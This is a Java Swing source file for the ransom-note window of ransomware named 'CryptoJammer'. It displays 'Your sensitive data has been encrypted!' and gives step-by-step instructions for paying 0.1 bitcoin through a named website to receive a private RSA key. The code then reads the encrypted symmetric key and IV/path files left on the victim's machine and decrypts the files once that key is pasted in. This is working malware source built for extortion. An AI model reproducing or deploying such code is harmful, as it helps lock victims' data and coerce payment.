/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package view;

import commands.SymmetricKey;
import commands.UniqueID;
import java.io.BufferedReader;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.InvalidKeyException;
import java.security.KeyFactory;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.RSAPrivateCrtKeySpec;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.stream.Stream;
import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import java.util.Arrays;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
/**
 *
 * @author admin
 */
public class Cryptojammer extends javax.swing.JFrame {
    
    byte[] encryptedSymKey;
    SecretKey decSymmetricKey;
    HashMap<byte[], Path> ivAndFile;
    UniqueID uniqueId;
    
    /**
     * Creates new form Cryptojammer
     */
    public Cryptojammer(byte[] encryptedSymKey, UniqueID uniqueId, HashMap<byte[], Path> ivAndFile) {
        initComponents();
        this.encryptedSymKey = encryptedSymKey;
        this.ivAndFile = ivAndFile;
        this.uniqueId = uniqueId;
        uniqueIdText.setText(uniqueId.getClientId());
    }
    
    // Create Cryptojammer from files
    public Cryptojammer() {
        initComponents();
        // getting iv paths form file
        getIvPathFromFile();
        // getting enc key bytes from file
        getEncryptedSymKeyFromFile();
        // getting unique ID
        uniqueIdText.setText(getUniqueIdFromFile());
    }


    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jPanel2 = new javax.swing.JPanel();
        jPanel1 = new javax.swing.JPanel();
        jLabel1 = new javax.swing.JLabel();
        jLabel2 = new javax.swing.JLabel();
        jLabel3 = new javax.swing.JLabel();
        jLabel6 = new javax.swing.JLabel();
        jScrollPane1 = new javax.swing.JScrollPane();
        rsaField = new javax.swing.JTextArea();
        jLabel4 = new javax.swing.JLabel();
        decryptButton = new javax.swing.JButton();
        jLabel5 = new javax.swing.JLabel();
        uniqueIdText = new javax.swing.JTextField();
        jTabbedPane1 = new javax.swing.JTabbedPane();
        jPanel3 = new javax.swing.JPanel();
        jScrollPane3 = new javax.swing.JScrollPane();
        jTextArea2 = new javax.swing.JTextArea();
        jPanel4 = new javax.swing.JPanel();
        jScrollPane2 = new javax.swing.JScrollPane();
        jTextArea1 = new javax.swing.JTextArea();
        jPanel5 = new javax.swing.JPanel();
        jScrollPane4 = new javax.swing.JScrollPane();
        jTextArea3 = new javax.swing.JTextArea();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        jPanel2.setBackground(new java.awt.Color(255, 0, 0));

        jPanel1.setBackground(new java.awt.Color(255, 0, 0));

        jLabel1.setFont(new java.awt.Font("Lucida Grande", 0, 24)); // NOI18N
        jLabel1.setForeground(new java.awt.Color(255, 255, 255));
        jLabel1.setText("CryptoJammer");

        jLabel2.setFont(new java.awt.Font("Lucida Grande", 1, 36)); // NOI18N
        jLabel2.setText("IMPORTANT");

        jLabel3.setFont(new java.awt.Font("Lucida Grande", 1, 24)); // NOI18N
        jLabel3.setText("Your sensitive data has been encrypted!");

        jLabel6.setIcon(new javax.swing.ImageIcon(getClass().getResource("/lock.png"))); // NOI18N

        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);
        jPanel1.setLayout(jPanel1Layout);
        jPanel1Layout.setHorizontalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addGap(84, 84, 84)
                .addComponent(jLabel6)
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel1Layout.createSequentialGroup()
                        .addGap(49, 49, 49)
                        .addComponent(jLabel3))
                    .addGroup(jPanel1Layout.createSequentialGroup()
                        .addGap(201, 201, 201)
                        .addComponent(jLabel1))
                    .addGroup(jPanel1Layout.createSequentialGroup()
                        .addGap(174, 174, 174)
                        .addComponent(jLabel2, javax.swing.GroupLayout.PREFERRED_SIZE, 246, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addContainerGap(896, Short.MAX_VALUE))
        );
        jPanel1Layout.setVerticalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel1Layout.createSequentialGroup()
                .addContainerGap(18, Short.MAX_VALUE)
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel1Layout.createSequentialGroup()
                        .addComponent(jLabel6)
                        .addContainerGap())
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel1Layout.createSequentialGroup()
                        .addComponent(jLabel1)
                        .addGap(24, 24, 24)
                        .addComponent(jLabel2, javax.swing.GroupLayout.PREFERRED_SIZE, 42, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addComponent(jLabel3)
                        .addGap(20, 20, 20))))
        );

        rsaField.setColumns(20);
        rsaField.setRows(5);
        jScrollPane1.setViewportView(rsaField);

        jLabel4.setFont(new java.awt.Font("Lucida Grande", 1, 13)); // NOI18N
        jLabel4.setText("Copy and paste here the private RSA key:");

        decryptButton.setBackground(new java.awt.Color(255, 255, 255));
        decryptButton.setText("Decrypt");
        decryptButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                decryptButtonActionPerformed(evt);
            }
        });

        jLabel5.setFont(new java.awt.Font("Lucida Grande", 1, 13)); // NOI18N
        jLabel5.setText("Your Unique ID is:");

        uniqueIdText.setEditable(false);
        uniqueIdText.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                uniqueIdTextActionPerformed(evt);
            }
        });

        jTextArea2.setEditable(false);
        jTextArea2.setBackground(new java.awt.Color(204, 204, 204));
        jTextArea2.setColumns(20);
        jTextArea2.setRows(5);
        jTextArea2.setText("\n Your data has been encrypted. This means your sensitive information stored in \n images, documents or pdf files has been locked. The only way for you to recover \n your files is to use our decryption system. And we will be happy to help. For a price.\n\n Look at the \"What can I do now?\" tab and follow the steps that are written there to recover \n your files.\n\n Do not close the application before reading the \"Important information\" tab!\n");
        jScrollPane3.setViewportView(jTextArea2);

        javax.swing.GroupLayout jPanel3Layout = new javax.swing.GroupLayout(jPanel3);
        jPanel3.setLayout(jPanel3Layout);
        jPanel3Layout.setHorizontalGroup(
            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane3, javax.swing.GroupLayout.DEFAULT_SIZE, 637, Short.MAX_VALUE)
        );
        jPanel3Layout.setVerticalGroup(
            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane3, javax.swing.GroupLayout.DEFAULT_SIZE, 341, Short.MAX_VALUE)
        );

        jTabbedPane1.addTab("What is happening?", jPanel3);

        jTextArea1.setEditable(false);
        jTextArea1.setBackground(new java.awt.Color(204, 204, 204));
        jTextArea1.setColumns(20);
        jTextArea1.setRows(5);
        jTextArea1.setText("\n As said before, your data has been encrypted with military grade encryption. There is only one\n way to get your data back, and that is by paying the ransom. \n\n How should you do that?\n There are five required steps for recovering your data:\n\n First buy 0.1 bitcoin, a helpful guide is https://www.coinbase.com/how-to-get-bitcoin.\n\n Then by using your browser go to https://cryptjammer.tjeerdsma.eu/decrypt and copy \n your Unique ID (on the top of the screen of CryptoJammer ransomware) and paste it into the \n uniqueId box on the site, then press submit. \n\n Now, scan the provided qr code with the Coinbase app or manually enter the bitcoin address \n as provided on the CryptoJammer website via the Coinbase website, a helpful guide for \n this is: https://help.coinbase.com/en/coinbase/trading-and-funding/cryptocurrency-trading-pairs/how-to-send-and-receive-cryptocurrency.html\n Also, do not forget to add the message from the CryptoJammer site and add this to bitcoin \n transfer. \n\n Now transfer the Bitcoins and wait up to 24 hours. \n After 24 hours again go to https://cryptojammer.tjeerdsma.eu/decrypt and enter your \n uniqueId again. \n At last click the \"Copy private key\" button and paste the result in the designated text area and \n press Decrypt. Now your data will be decrypted again!");
        jScrollPane2.setViewportView(jTextArea1);

        javax.swing.GroupLayout jPanel4Layout = new javax.swing.GroupLayout(jPanel4);
        jPanel4.setLayout(jPanel4Layout);
        jPanel4Layout.setHorizontalGroup(
            jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane2, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, 637, Short.MAX_VALUE)
        );
        jPanel4Layout.setVerticalGroup(
            jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane2, javax.swing.GroupLayout.DEFAULT_SIZE, 341, Short.MAX_VALUE)
        );

        jTabbedPane1.addTab("What can I do now?", jPanel4);

        jTextArea3.setEditable(false);
        jTextArea3.setBackground(new java.awt.Color(204, 204, 204));
        jTextArea3.setColumns(20);
        jTextArea3.setRows(5);
        jTextArea3.setText("\n You might notice three new text files on your computer. Do not delete these files! They are used \n by the Cryptojammer application in case you close the application before decrypting. \n\n Do not worry all the information stored in these files is public, like your unique ID details, so there \n is nothing you can use to decrypt your files by yourself. \n\n When copying the private key to the designated space copy the key from and including \n \"-----BEGIN PRIVATE KEY-----\" to and including \"-----END PRIVATE KEY-----\". \n\n Thanks for using the CryptoJammer ransomware, and do not hesitate to contact us at \n support@cryptojammer.tjeerdsma.eu if you experience technical difficulties.\n ");
        jScrollPane4.setViewportView(jTextArea3);

        javax.swing.GroupLayout jPanel5Layout = new javax.swing.GroupLayout(jPanel5);
        jPanel5.setLayout(jPanel5Layout);
        jPanel5Layout.setHorizontalGroup(
            jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel5Layout.createSequentialGroup()
                .addComponent(jScrollPane4, javax.swing.GroupLayout.PREFERRED_SIZE, 636, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(0, 1, Short.MAX_VALUE))
        );
        jPanel5Layout.setVerticalGroup(
            jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane4, javax.swing.GroupLayout.DEFAULT_SIZE, 341, Short.MAX_VALUE)
        );

        jTabbedPane1.addTab("Important information", jPanel5);

        javax.swing.GroupLayout jPanel2Layout = new javax.swing.GroupLayout(jPanel2);
        jPanel2.setLayout(jPanel2Layout);
        jPanel2Layout.setHorizontalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel2Layout.createSequentialGroup()
                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel2Layout.createSequentialGroup()
                        .addGap(12, 12, 12)
                        .addComponent(jLabel5)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(uniqueIdText, javax.swing.GroupLayout.PREFERRED_SIZE, 510, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addComponent(jTabbedPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 658, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel2Layout.createSequentialGroup()
                        .addGap(18, 18, 18)
                        .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 339, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(jLabel4)))
                    .addGroup(jPanel2Layout.createSequentialGroup()
                        .addGap(77, 77, 77)
                        .addComponent(decryptButton, javax.swing.GroupLayout.PREFERRED_SIZE, 229, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel2Layout.createSequentialGroup()
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addComponent(jPanel1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(148, 148, 148))
        );
        jPanel2Layout.setVerticalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel2Layout.createSequentialGroup()
                .addComponent(jPanel1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel2Layout.createSequentialGroup()
                        .addGap(43, 43, 43)
                        .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(uniqueIdText, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(jLabel5))
                        .addGap(18, 18, 18)
                        .addComponent(jTabbedPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 387, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(jPanel2Layout.createSequentialGroup()
                        .addGap(25, 25, 25)
                        .addComponent(jLabel4)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 366, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(18, 18, 18)
                        .addComponent(decryptButton)))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel2, javax.swing.GroupLayout.PREFERRED_SIZE, 1043, javax.swing.GroupLayout.PREFERRED_SIZE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel2, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void decryptButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_decryptButtonActionPerformed
        
        try{
        // Decode the private RSA key from the text area
        String privateKeyString = rsaField.getText();
   
        SymmetricKey symKey = SymmetricKey.getSymmetricKey();
        
        privateKeyString = privateKeyString.replaceAll("\\n", "")
                    .replace("-----BEGIN PRIVATE KEY-----", "")  
                    .replace("-----END PRIVATE KEY-----", "");
        
        
        KeyFactory kf = KeyFactory.getInstance("RSA");
        PKCS8EncodedKeySpec keySpec = new PKCS8EncodedKeySpec(Base64.getMimeDecoder()
                .decode(privateKeyString.getBytes()));
        PrivateKey secretRSAKey = kf.generatePrivate(keySpec);
        
        // Decrypt symmetric key
        decSymmetricKey = symKey.decryptKey(secretRSAKey, encryptedSymKey);
        
        // Opening the decryption window
        new DecryptionProcess(decSymmetricKey, ivAndFile).setVisible(true);

        } catch (Exception ex) {
            ex.printStackTrace();
            JFrame warningframe = new JFrame();
            JOptionPane.showMessageDialog(warningframe, "RSA private key not recognized. Please make sure the private key is copied in the correct format.", "", JOptionPane.WARNING_MESSAGE);
        }
       
    }//GEN-LAST:event_decryptButtonActionPerformed

    private void uniqueIdTextActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_uniqueIdTextActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_uniqueIdTextActionPerformed

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(Cryptojammer.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(Cryptojammer.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(Cryptojammer.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(Cryptojammer.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new Cryptojammer().setVisible(true);
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton decryptButton;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JLabel jLabel4;
    private javax.swing.JLabel jLabel5;
    private javax.swing.JLabel jLabel6;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JPanel jPanel2;
    private javax.swing.JPanel jPanel3;
    private javax.swing.JPanel jPanel4;
    private javax.swing.JPanel jPanel5;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JScrollPane jScrollPane2;
    private javax.swing.JScrollPane jScrollPane3;
    private javax.swing.JScrollPane jScrollPane4;
    private javax.swing.JTabbedPane jTabbedPane1;
    private javax.swing.JTextArea jTextArea1;
    private javax.swing.JTextArea jTextArea2;
    private javax.swing.JTextArea jTextArea3;
    private javax.swing.JTextArea rsaField;
    private javax.swing.JTextField uniqueIdText;
    // End of variables declaration//GEN-END:variables
    
    public void getIvPathFromFile() {
        BufferedReader br = null;
        ivAndFile = new HashMap<byte[], Path>();
        // read iv vector and paths from file
        try{
            File file ;
            if (!System.getProperty("os.name").equals("Mac OS X")) {
                file = new File("C:\\Users\\IvAndPath_DO_NOT_DELETE.txt");
            } else {
                file = new File("/Users/admin/Desktop/IvAndPath_DO_NOT_DELETE.txt");
            }
            
            
            //create BufferedReader object from the File
            br = new BufferedReader( new FileReader(file) );
            String line = null;
            //read file line by line
            while ( (line = br.readLine()) != null ){
                //split the line by :
                String[] parts = line.split("<>");
                //first part is iv, second is path
                byte[] ivString = getByteFromArray(parts[0].trim());
                System.out.println(Arrays.toString(ivString));
                Path pathString = Paths.get(parts[1].trim());
                System.out.println(pathString);
                //put iv, pathString in HashMap if they are not empty
                if( !ivString.equals("") && !pathString.equals("") ) {
                    ivAndFile.put(ivString, pathString);
                }
            }         
        }catch(Exception e){
            e.printStackTrace();
        }finally{
            if(br != null){
                try { 
                    br.close(); 
                }catch(Exception e){ 
                }
            }
        }    
    } 
    
    public void getEncryptedSymKeyFromFile() {
        BufferedReader brKey = null;
        File file ;
        try {
        if (!System.getProperty("os.name").equals("Mac OS X")) {
                file = new File("C:\\Users\\EncKey_DO_NOT_DELETE.txt");
            } else {
                file = new File("/Users/admin/Desktop/EncKey_DO_NOT_DELETE.txt");
            }
        
brKey = new BufferedReader( new FileReader(file) );
            String line = null;
            //read file line by line
            while ( (line = brKey.readLine()) != null ){
                //first part is iv, second is path
                if( !line.equals("")) encryptedSymKey = getByteKeyFromArray(line);
                
                }
                     
        }catch(Exception e){
            e.printStackTrace();
        }finally{
            if(brKey != null){
                try { 
                    brKey.close(); 
                }catch(Exception e){ 
                }
            }
        }
			
    
    }
    
    public String getUniqueIdFromFile() {
        String file;
        if (!System.getProperty("os.name").equals("Mac OS X")) {
            file = "C:\\Users\\UniqueID_DO_NOT_DELETE.txt";
        } else {
            file = "/Users/admin/Desktop/UniqueID_DO_NOT_DELETE.txt";
        }
        
        StringBuilder contentBuilder = new StringBuilder();
        try (Stream<String> stream = Files.lines( Paths.get(file), StandardCharsets.ISO_8859_1)) 
        {
            stream.forEach(s -> contentBuilder.append(s).append("\n"));
        } catch (IOException e) {
            e.printStackTrace();
        }
        return contentBuilder.toString();
 
    }
    
    public byte[] getByteFromArray(String arrayString) {
        byte[] extractedBytes = new byte[128/8]; 
        int i = 0;
        
        arrayString = arrayString.replaceAll(",", "")
                .replace("[", "")
                .replace("]","")
                .replace(" ", "s");
        
        Pattern p = Pattern.compile("-?\\d+");
        Matcher m = p.matcher(arrayString);
        while(m.find()) {
            Integer intB = Integer.parseInt(m.group());
            extractedBytes[i] = intB.byteValue();
            i++;
        }
        
        return extractedBytes;
    }
    
    public byte[] getByteKeyFromArray(String arrayString) {
        ArrayList<Byte> exBytes = new ArrayList<>();
        
        int i = 0;
        
        arrayString = arrayString.replaceAll(",", "")
                .replace("[", "")
                .replace("]","")
                .replace(" ", "s");
        
        Pattern p = Pattern.compile("-?\\d+");
        Matcher m = p.matcher(arrayString);
        while(m.find()) {
            Integer intB = Integer.parseInt(m.group());
            exBytes.add(intB.byteValue());
            i++;
        }
        
        byte[] extractedBytes = new byte[exBytes.size()]; 
        for (int in = 0; in < extractedBytes.length; in ++) {
            extractedBytes[in] = exBytes.get(in); 
        }
        
        return extractedBytes;
    }
}
